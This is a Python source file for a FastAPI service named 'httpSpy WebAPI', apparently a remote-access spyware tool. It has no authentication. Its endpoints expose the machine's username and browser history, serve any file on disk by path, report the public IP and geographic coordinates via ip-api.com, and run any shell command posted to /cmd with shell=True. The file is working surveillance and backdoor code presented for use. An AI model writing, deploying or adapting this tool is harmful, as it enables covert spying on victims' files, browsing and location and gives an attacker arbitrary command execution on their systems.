from fastapi import FastAPI
from fastapi.responses import HTMLResponse, FileResponse
import os
import requests
import uvicorn
import configparser
import subprocess
import platform
import getpass
import browser_history
cfg = configparser.ConfigParser()
thisfolder = os.path.dirname(os.path.abspath(__file__))
initfile = os.path.join(thisfolder, 'cfg.ini')
cfg.read(initfile)
app_port = int(cfg.get("Core", "Port"))
app_host = cfg.get("Core", "LocalIP")
app = FastAPI(title="httpSpy WebAPI", redoc_url="", docs_url="/")


@app.get('/info/username')
def user_info():
    username = getpass.getuser()
    return {"username": username}


@app.get('/info/history', deprecated=True)
def get_browser_history():
    b = browser_history.get_history()
    print(b)


@app.get('/files/get')
def get_file_by_path(path: str):
    return FileResponse(path=path)


@app.get('/info/geoip')
def get_user_geolocation():
    r = requests.get("http://ip-api.com/json/")
    data = r.json()
    return {"public-ip": data['query'], "country-code": data['countryCode'], "coordinates": f"{data['lat']}, {data['lon']}"}


@app.post('/cmd')
def execute_command(command: str):
    output = subprocess.check_output({command}, shell=True, text=True)
    print(output)
    return {"output": output}


if __name__ == '__main__':
    uvicorn.run(app, port=app_port, host=app_host)
